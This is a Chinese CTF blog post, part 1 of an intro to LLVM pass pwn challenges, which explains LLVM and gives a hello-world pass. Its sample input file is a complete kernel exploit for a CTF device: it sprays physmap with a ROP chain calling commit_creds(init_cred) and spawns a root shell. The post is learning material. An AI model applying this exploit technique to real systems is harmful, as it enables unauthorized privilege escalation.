@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="近年来，pwn题出的可谓是越来越花，从C++到kernel，再到Rust、Go、Java一众语言，还有LLVM。其中LLVM在各种比赛中的出现频率越来越高，值得引起重视。借这篇文章，笔者开始LLVM pass类pwn题的入门。 首先，既然要研究LLVM，就要清楚LLVM到底是什么。  它是以C++编写的构架编译器的框架系统。用于优化以任意程序语言编写的程序的编译时间(compile-time)、链">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LLVM pass pwn 入门 (1)">
+<meta property="og:url" content="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/index.html">
+<meta property="og:site_name" content="CoLin&#39;s Pwnhome">
+<meta property="og:description" content="近年来，pwn题出的可谓是越来越花，从C++到kernel，再到Rust、Go、Java一众语言，还有LLVM。其中LLVM在各种比赛中的出现频率越来越高，值得引起重视。借这篇文章，笔者开始LLVM pass类pwn题的入门。 首先，既然要研究LLVM，就要清楚LLVM到底是什么。  它是以C++编写的构架编译器的框架系统。用于优化以任意程序语言编写的程序的编译时间(compile-time)、链">
+<meta property="og:locale">
+<meta property="article:published_time" content="2023-02-28T14:27:40.000Z">
+<meta property="article:modified_time" content="2023-02-28T14:27:40.791Z">
+<meta property="article:author" content="CoLin">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>LLVM pass pwn 入门 (1) | CoLin's Pwnhome</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CoLin's Pwnhome</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's Pwnhome">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          LLVM pass pwn 入门 (1)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 22:27:40" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:40+08:00">2023-02-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>近年来，pwn题出的可谓是越来越花，从C++到kernel，再到Rust、Go、Java一众语言，还有LLVM。其中LLVM在各种比赛中的出现频率越来越高，值得引起重视。借这篇文章，笔者开始LLVM pass类pwn题的入门。</p>
+<p>首先，既然要研究LLVM，就要清楚LLVM到底是什么。</p>
+<blockquote>
+<p>它是以C++编写的构架编译器的框架系统。用于优化以任意程序语言编写的程序的编译时间(compile-time)、链接时间(link-time)、运行时间(run-time)以及空闲时间(idle-time)，对开发者保持开放，并兼容已有脚本。（摘自<a target="_blank" rel="noopener" href="https://blog.csdn.net/yayaayaya123/article/details/83993041?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165728197316781818799638%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165728197316781818799638&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-83993041-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&utm_term=LLVM&spm=1018.2226.3001.4187">资料</a>）</p>
+</blockquote>
+<p>LLVM在编译过程中实际上发挥了一个牵线搭桥的作用。高级语言多种多样，但无论是哪一种语言的编译器，都需要对高级语言编写的代码进行词法与句法分析，这是编译器前端部分的工作。在分析完成后，前端会输出一个抽象语法树AST，由LLVM进行分析与优化，转化为中间表示IR。再由编译器后端根据IR生成可供执行的二进制代码。</p>
+<blockquote>
+<p>而pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果。<br>大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。（摘自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">资料</a>）</p>
+</blockquote>
+<p>下面，笔者使用Ubuntu 20.04系统进行第一个LLVM pass的编写测试。</p>
+<p>首先安装Clang：<code>apt install clang</code>，在Ubuntu 20.04安装clang会附带安装llvm-9和llvm-10，经过测试发现，只有llvm-10能够正常使用，用llvm-9的库编译会报错。</p>
+<p>这里借<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">资料</a>中的测试代码编写：</p>
+<p>myFirstLLVMpass.cpp:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span><span class="comment">//写Pass所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span><span class="comment">//操作函数所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span><span class="comment">//打印输出所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">//声明匿名空间，被声明的内容仅在文件内部可见</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;<span class="comment">//重写runOnFunction，使得每次遍历到一个函数的时候就输出函数名</span></span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;<span class="comment">//注册类Hello，第一个参数是命令行参数，第二个参数是名字</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>上面就是LLVM pass的C++代码了。我们需要一个C语言文件，这个文件中的内容无关紧要，这里用笔者做kernel pwn题中的一个文件为例：</p>
+<p>firstLLVMtest.c:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-7.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810C92E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF82A6B700</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81C00FB0</span> + <span class="number">0x1B</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> ret = <span class="number">0xFFFFFFFF810001FC</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"><span class="type">size_t</span>* map_spray[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">int</span> dev;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>* space)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); index++)</span><br><span class="line">        space[index] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); index++)</span><br><span class="line">        space[index] = ret;</span><br><span class="line">    space[index++] = poprdi_ret;</span><br><span class="line">    space[index++] = init_cred;</span><br><span class="line">    space[index++] = commit_creds;</span><br><span class="line">    space[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    space[index++] = user_cs;</span><br><span class="line">    space[index++] = user_rflags;</span><br><span class="line">    space[index++] = user_sp;</span><br><span class="line">    space[index] = user_ss;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spray content below:&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)space, page_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    dev = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev &lt; <span class="number">0</span>)     <span class="comment">// failed to open key device, an unexpected error</span></span><br><span class="line">        error_log(<span class="string">&quot;Cannot open device \&quot;/dev/kgadget\&quot;!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);      <span class="comment">// the size of a page, namely 4096 bytes</span></span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spraying physmap......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    makeROP(map_spray[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15000</span>; i++)&#123;</span><br><span class="line">        map_spray[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!map_spray[i])</span><br><span class="line">            error_log(<span class="string">&quot;Mmap Failure!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(map_spray[i], map_spray[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Ready to turn to kernel......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(<span class="string">&quot;mov r15, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x87654321;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, poprsp_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, dev;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
